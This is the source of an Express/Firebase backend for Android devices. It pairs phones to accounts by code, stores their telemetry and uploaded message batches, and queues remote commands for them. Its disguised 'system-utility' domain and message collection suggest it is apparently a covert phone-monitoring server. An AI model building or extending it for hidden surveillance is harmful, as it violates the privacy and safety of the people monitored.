import express from 'express'
import admin from 'firebase-admin'
import cors from 'cors'
import dotenv from 'dotenv'
import rateLimit from 'express-rate-limit'
import helmet from 'helmet'
import crypto from 'crypto'
import path from 'path'
import { existsSync } from 'fs'
import { fileURLToPath } from 'url'

const __dirname = path.dirname(fileURLToPath(import.meta.url))

// Load .env from the server folder, the repo root (where the Freebuff API
// Keys UI writes), and the working directory. Real env vars always win.
for (const envFile of [
  path.join(__dirname, '.env'),
  path.join(__dirname, '..', '.env'),
  path.join(process.cwd(), '.env')
]) {
  if (existsSync(envFile)) dotenv.config({ path: envFile })
}

const app = express()

// Security middleware (CSP disabled so the built dashboard can reach the
// Firebase SDK endpoints; other helmet protections stay enabled)
app.use(helmet({ contentSecurityPolicy: false }))
app.use(cors({
 origin: process.env.ALLOWED_ORIGINS?.split(',') || ['https://dashboard.system-utility.cloud'],
 credentials: true,
 methods: ['GET', 'POST']
}))
app.use(express.json({ limit: '5mb' }))

// Production API alias: the dashboard calls relative /api/status and
// /api/devices (Vite proxies these to /api/v2/* in dev). When this server
// serves the built dashboard we rewrite /api/* -> /api/v2/* so the same
// dashboard build works without a proxy.
app.use((req, res, next) => {
  if (req.url.startsWith('/api/') && !req.url.startsWith('/api/v2')) {
    req.url = '/api/v2' + req.url.slice(4)
  }
  next()
})

// Firebase initialization — accepts the full service-account JSON blob
// (FIREBASE_SERVICE_ACCOUNT_JSON) or discrete fields (FIREBASE_PROJECT_ID,
// FIREBASE_CLIENT_EMAIL, FIREBASE_PRIVATE_KEY)
const serviceAccount = (() => {
  const raw = process.env.FIREBASE_SERVICE_ACCOUNT_JSON
  if (raw) {
    try {
      return JSON.parse(raw)
    } catch (e) {
      console.error('Invalid FIREBASE_SERVICE_ACCOUNT_JSON:', e.message)
      process.exit(1)
    }
  }
  const { FIREBASE_PROJECT_ID, FIREBASE_CLIENT_EMAIL, FIREBASE_PRIVATE_KEY } = process.env
  if (FIREBASE_PROJECT_ID && FIREBASE_CLIENT_EMAIL && FIREBASE_PRIVATE_KEY) {
    return {
      type: 'service_account',
      project_id: FIREBASE_PROJECT_ID,
      client_email: FIREBASE_CLIENT_EMAIL,
      private_key: FIREBASE_PRIVATE_KEY.replace(/\\n/g, '\n')
    }
  }
  return {}
})()
const databaseUrl = process.env.FIREBASE_DATABASE_URL || 'https://android-a0d2c-default-rtdb.europe-west1.firebasedatabase.app'

if (!serviceAccount.project_id || !databaseUrl) {
 console.error('Firebase configuration missing')
 process.exit(1)
}

admin.initializeApp({
 credential: admin.credential.cert(serviceAccount),
 databaseURL: databaseUrl
})

const db = admin.database()

// Encryption utilities
const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || crypto.randomBytes(32).toString('hex')
const ALGORITHM = 'aes-256-gcm'

const encrypt = (text) => {
 try {
 const iv = crypto.randomBytes(16)
 const cipher = crypto.createCipheriv(ALGORITHM, Buffer.from(ENCRYPTION_KEY, 'hex'), iv)
 let encrypted = cipher.update(text, 'utf8', 'hex')
 encrypted += cipher.final('hex')
 const authTag = cipher.getAuthTag()
 return iv.toString('hex') + ':' + authTag.toString('hex') + ':' + encrypted
 } catch (e) {
 console.error('Encryption error:', e.message)
 return null
 }
}

const decrypt = (text) => {
 try {
 const parts = text.split(':')
 if (parts.length !== 3) return null
 const iv = Buffer.from(parts[0], 'hex')
 const authTag = Buffer.from(parts[1], 'hex')
 const encrypted = parts[2]
 const decipher = crypto.createDecipheriv(ALGORITHM, Buffer.from(ENCRYPTION_KEY, 'hex'), iv)
 decipher.setAuthTag(authTag)
 let decrypted = decipher.update(encrypted, 'hex', 'utf8')
 decrypted += decipher.final('utf8')
 return decrypted
 } catch (e) {
 return null
 }
}

// Telemetry history is stored as capped JSON arrays inside single RTDB nodes
// (history/battery, history/events). Atomic transactions keep them bounded
// (720 battery points ≈ 12h at a 60s heartbeat, 200 events) without any
// prune-sweep job.
const parseJsonArray = (raw) => {
 if (Array.isArray(raw)) return raw
 if (typeof raw === 'string') {
   try {
     const parsed = JSON.parse(raw)
     return Array.isArray(parsed) ? parsed : []
   } catch (e) {
     return []
   }
 }
 return []
}

const appendHistory = async (refPath, entry, cap) => {
  await db.ref(refPath).transaction((current) => {
    const arr = parseJsonArray(current)
    arr.push(entry)
    return JSON.stringify(arr.slice(-cap))
  })
}

// Rate limiters
const telemetryLimiter = rateLimit({
 windowMs: 5 * 60 * 1000,
 max: 50,
 keyGenerator: (req) => req.deviceId || req.ip,
 skip: (req) => !req.deviceId,
 standardHeaders: false,
 legacyHeaders: false
})

const pairLimiter = rateLimit({
 windowMs: 15 * 60 * 1000,
 max: 5,
 keyGenerator: (req) => req.uid || req.ip,
 standardHeaders: false,
 legacyHeaders: false
})

// Pairing code TTL — the same 5-minute window enforced by /api/v2/pair is
// used to prune stale pairing_requests entries written by /api/v2/telemetry.
const PAIR_CODE_TTL_MS = 300000

// Validation
const sanitizeDeviceId = (id) => {
 if (!id || typeof id !== 'string') return null
 const clean = id.replace(/[^a-zA-Z0-9_-]/g, '').substring(0, 64)
 return clean.length > 0 ? clean : null
}

const sanitizeUserId = (id) => {
 if (!id || typeof id !== 'string') return null
 return id.substring(0, 128)
}

// Middleware
const verifyUser = async (req, res, next) => {
 try {
 const token = req.headers.authorization?.split('Bearer ')[1]
 if (!token) return res.status(401).json({ error: 'No token' })
 const decoded = await admin.auth().verifyIdToken(token)
 req.uid = decoded.uid
 next()
 } catch (e) {
 res.status(403).json({ error: 'Invalid token' })
 }
}

const validateDevice = async (req, res, next) => {
 const rawId = req.headers['x-device-id'] || req.body?.device_id
 const deviceId = sanitizeDeviceId(rawId)
 if (!deviceId) return res.status(401).json({ error: 'Invalid device ID' })
 try {
 const snap = await db.ref(`devices/${deviceId}`).once('value')
 if (!snap.exists()) return res.status(403).json({ error: 'Device not found' })
 const device = snap.val()
 if (!device.pairedTo) return res.status(403).json({ error: 'Device not paired' })
 req.deviceId = deviceId
 next()
 } catch (e) {
 console.error('validateDevice:', e.message)
 res.status(500).json({ error: 'Server error' })
 }
}

const validateDeviceLoose = async (req, res, next) => {
 const rawId = req.headers['x-device-id'] || req.body?.device_id
 const deviceId = sanitizeDeviceId(rawId)
 if (!deviceId) return res.status(401).json({ error: 'Invalid device ID' })
 req.deviceId = deviceId
 next()
}

// Routes
app.get('/', (req, res) => {
  // Serve the built dashboard at / when it exists (production mode);
  // otherwise keep the plain JSON status endpoint.
  const distIndex = path.join(__dirname, '..', 'dashboard', 'dist', 'index.html')
  if (existsSync(distIndex)) return res.sendFile(distIndex)
  res.json({ status: 'online', version: '3.1.0' })
})

app.get('/api/v2/status', (req, res) => {
  res.json({ status: 'online', version: '3.1.0', uptime: Math.floor(process.uptime()) })
})

app.get('/api/v2/devices', verifyUser, async (req, res) => {
  try {
    const uid = req.uid
    const ownedSnap = await db.ref(`users/${uid}/devices`).once('value')
    const owned = ownedSnap.val() || {}
    const ids = Object.keys(owned)

    const devices = await Promise.all(ids.map(async (deviceId) => {
      const snap = await db.ref(`devices/${deviceId}`).once('value')
      if (!snap.exists()) return null
      const d = snap.val()
      return {
        deviceId,
        status: d.status || 'unknown',
        battery: typeof d.battery === 'number' ? d.battery : null,
        interval: d.interval || null,
        lastSeen: d.lastSeen || null,
        updatedAt: d.updatedAt || null,
        pairedAt: owned[deviceId]?.pairedAt || null
      }
    }))

    res.json({ success: true, devices: devices.filter(Boolean) })
  } catch (e) {
    console.error('devices list:', e.message)
    res.status(500).json({ error: 'Internal error' })
  }
})

app.post('/api/v2/telemetry', telemetryLimiter, validateDeviceLoose, async (req, res) => {
 try {
 const { device_id, timestamp, status, battery, interval, pairing_code, pairing_request, type, permissions } = req.body
 const deviceId = sanitizeDeviceId(device_id) || req.deviceId

 // battery/interval are validated only when present: the heartbeat always
 // sends them, but event payloads (e.g. permission_lost) legitimately omit
 // them and must not be rejected.
 if (battery !== undefined && (typeof battery !== 'number' || battery < 0 || battery > 100)) {
 return res.status(400).json({ error: 'Invalid battery' })
 }
 if (interval !== undefined && (typeof interval !== 'number' || interval < 30 || interval > 3600)) {
 return res.status(400).json({ error: 'Invalid interval' })
 }

 const deviceUpdate = {
 lastSeen: timestamp || Date.now(),
 status: status || 'active',
 updatedAt: Date.now()
 }
 if (battery !== undefined) deviceUpdate.battery = battery
 if (interval !== undefined) deviceUpdate.interval = interval
 await db.ref(`devices/${deviceId}`).update(deviceUpdate)

 // Battery history feeds the dashboard chart. Only heartbeats carry a
 // battery value; event payloads (permission_lost, …) skip it.
 if (typeof battery === 'number') {
   await appendHistory(`devices/${deviceId}/history/battery`, { t: timestamp || Date.now(), b: battery }, 720)
 }
 // Explicit events feed the activity timeline (paired, permission_lost, …).
 if (typeof type === 'string' && type.length > 0) {
   const event = { type, ts: timestamp || Date.now() }
   if (permissions !== undefined) event.data = { permissions }
   await appendHistory(`devices/${deviceId}/history/events`, event, 200)
 }

 // Pairing contract: an unpaired app advertises a 6-digit code in its
 // heartbeat. Persist it under pairing_requests/<deviceId> (only while the
 // device stays unpaired) so POST /api/v2/pair can resolve the code.
 let paired = false
 if (pairing_request === true && typeof pairing_code === 'string' && /^\d{6}$/.test(pairing_code)) {
 const pairedSnap = await db.ref(`devices/${deviceId}/pairedTo`).once('value')
 if (pairedSnap.exists()) {
   paired = true
 } else {
   const now = Date.now()
   await db.ref(`pairing_requests/${deviceId}`).set({
     pairing_code,
     device_id: deviceId,
     timestamp: now
   })
   // Prune expired requests (same 5 min TTL as /api/v2/pair) so the node
   // doesn't grow unbounded.
   const reqs = (await db.ref('pairing_requests').once('value')).val() || {}
   const prune = {}
   Object.entries(reqs).forEach(([id, v]) => {
     if (v && now - (v.timestamp || 0) > PAIR_CODE_TTL_MS) prune[id] = null
   })
   if (Object.keys(prune).length > 0) await db.ref('pairing_requests').update(prune)
 }
 }

 const commandsSnap = await db.ref(`devices/${deviceId}/commands`).orderByChild('timestamp').limitToLast(5).once('value')
 res.json({ success: true, commands: commandsSnap.val() || null, paired })
 } catch (e) {
 console.error('telemetry:', e.message)
 res.status(500).json({ error: 'Internal error' })
 }
})

app.post('/api/v2/data', telemetryLimiter, validateDevice, async (req, res) => {
 try {
 const deviceId = req.deviceId
 const batch = req.body

 if (!batch || typeof batch !== 'object') {
 return res.status(400).json({ error: 'Invalid batch' })
 }

 const batchRef = db.ref(`devices/${deviceId}/raw_batches`)
 const encryptedBatch = {
 data: encrypt(JSON.stringify(batch)),
 receivedAt: Date.now()
 }
 await batchRef.push(encryptedBatch)

 await batchRef.transaction((currentData) => {
 if (!currentData) return currentData
 const keys = Object.keys(currentData)
 if (keys.length <= 100) return currentData
 keys.sort()
 const toDelete = keys.slice(0, keys.length - 100)
 const result = { ...currentData }
 toDelete.forEach(k => delete result[k])
 return result
 })

 res.json({ success: true, received: Array.isArray(batch.messages) ? batch.messages.length : 0 })
 } catch (e) {
 console.error('data:', e.message)
 res.status(500).json({ error: 'Internal error' })
 }
})

app.post('/api/v2/pair', verifyUser, pairLimiter, async (req, res) => {
 try {
 const { code } = req.body
 const userId = sanitizeUserId(req.uid)
 
 if (!code || typeof code !== 'string' || !/^\d{6}$/.test(code)) {
 return res.status(400).json({ error: 'Invalid pairing code' })
 }

 const snap = await db.ref('pairing_requests').once('value')
 const requests = snap.val() || {}
 const entry = Object.entries(requests).find(([_, v]) => v.pairing_code === code && Date.now() - v.timestamp < PAIR_CODE_TTL_MS)
 
 if (!entry) return res.status(404).json({ error: 'Invalid or expired code' })

 const [deviceId] = entry
 const existingSnap = await db.ref(`devices/${deviceId}/pairedTo`).once('value')
 if (existingSnap.exists()) {
 return res.status(409).json({ error: 'Device already paired' })
 }

 await db.ref(`users/${userId}/devices/${deviceId}`).set({
 pairedAt: Date.now()
 })
 await db.ref(`devices/${deviceId}/pairedTo`).set(userId)
 await db.ref(`devices/${deviceId}/pairing_code`).remove()
 await db.ref(`pairing_requests/${deviceId}`).remove()
 await appendHistory(`devices/${deviceId}/history/events`, { type: 'paired', ts: Date.now(), data: { account: userId } }, 200)
 res.json({ success: true, deviceId })
 } catch (e) {
 console.error('pair:', e.message)
 res.status(500).json({ error: 'Internal error' })
 }
})

app.get('/api/v2/devices/:deviceId/history', verifyUser, async (req, res) => {
 try {
 const deviceId = sanitizeDeviceId(req.params.deviceId)
 if (!deviceId) return res.status(400).json({ error: 'Invalid device ID' })

 const access = await db.ref(`users/${req.uid}/devices/${deviceId}`).once('value')
 if (!access.exists()) return res.status(403).json({ error: 'No access' })

 const snap = await db.ref(`devices/${deviceId}/history`).once('value')
 const val = snap.val() || {}
 const battery = parseJsonArray(val.battery)
 const events = parseJsonArray(val.events)

 res.json({
   success: true,
   battery: battery.slice(-720),
   // Newest first — ready for the timeline render.
   events: events.slice(-200).reverse()
 })
 } catch (e) {
 console.error('device history:', e.message)
 res.status(500).json({ error: 'Internal error' })
 }
})

app.get('/api/v2/activity', verifyUser, async (req, res) => {
 try {
 const uid = req.uid
 const ownedSnap = await db.ref(`users/${uid}/devices`).once('value')
 const ids = Object.keys(ownedSnap.val() || {})

 const all = []
 await Promise.all(ids.map(async (deviceId) => {
   const snap = await db.ref(`devices/${deviceId}/history/events`).once('value')
   const events = parseJsonArray(snap.val())
   events.forEach((e) => {
     if (e && typeof e.type === 'string') all.push({ deviceId, ...e })
   })
 }))

 all.sort((a, b) => (b.ts || 0) - (a.ts || 0))
 res.json({ success: true, activity: all.slice(0, 50) })
 } catch (e) {
 console.error('activity:', e.message)
 res.status(500).json({ error: 'Internal error' })
 }
})

app.get('/api/v2/devices/:deviceId', verifyUser, async (req, res) => {
 try {
 const deviceId = sanitizeDeviceId(req.params.deviceId)
 if (!deviceId) return res.status(400).json({ error: 'Invalid device ID' })
 
 const access = await db.ref(`users/${req.uid}/devices/${deviceId}`).once('value')
 if (!access.exists()) return res.status(403).json({ error: 'No access' })
 
 const snap = await db.ref(`devices/${deviceId}`).once('value')
 if (!snap.exists()) return res.status(404).json({ error: 'Device not found' })
 
 res.json({ success: true, data: snap.val() })
 } catch (e) {
 console.error('devices:', e.message)
 res.status(500).json({ error: 'Internal error' })
 }
})

// Serve the built dashboard (dashboard/dist) when present — production mode.
// Dashboard and API then live on the same origin (no CORS needed).
const dashboardDist = path.join(__dirname, '..', 'dashboard', 'dist')
if (existsSync(dashboardDist)) {
  app.use(express.static(dashboardDist))
  app.get('*', (req, res, next) => {
    if (req.path.startsWith('/api')) return next()
    res.sendFile(path.join(dashboardDist, 'index.html'))
  })
  console.log(`Serving dashboard from ${dashboardDist}`)
}

const PORT = process.env.PORT || 3000
app.listen(PORT, () => {
 console.log(`Server v3.1.0 listening on ${PORT}`)
})
